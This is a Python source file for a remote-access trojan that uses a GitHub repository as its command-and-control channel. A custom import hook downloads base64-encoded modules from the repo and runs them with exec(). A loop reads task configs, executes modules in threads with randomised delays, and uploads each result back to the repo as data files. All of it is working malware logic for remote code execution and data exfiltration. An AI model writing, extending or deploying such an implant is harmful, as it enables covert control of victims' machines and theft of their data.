import base64
import importlib
import json
import random
import sys
import threading
import time
import github3
from datetime import datetime

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_spec(self, name, path=None, target=None):
        print(f"[*] Attempting to retrieve {name}")
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)

        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return importlib.util.spec_from_loader(name, loader=self)

        return None
    
    def create_module(self, spec):
        return None  # Use default module creation

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        for task in config:
            if task['modules'] not in sys.modules:
                importlib.import_module(task['modules'])
        return config
    
    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    def run(self):
        while True:
            config = self.get_config()
            print(f"[*] Running tasks: {config}")
            for task in config:
                thread = threading.Thread(target = self.module_runner, args = (task['modules'],))
                thread.start()
                time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30*60, 3*60*60))

def github_connect():
    with open('token.txt', 'r') as f:
        token = f.read()
        user = 'YarKhan02'
        sess = github3.login(token=token)
        return sess.repository(user, 'Trojan')
    
def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()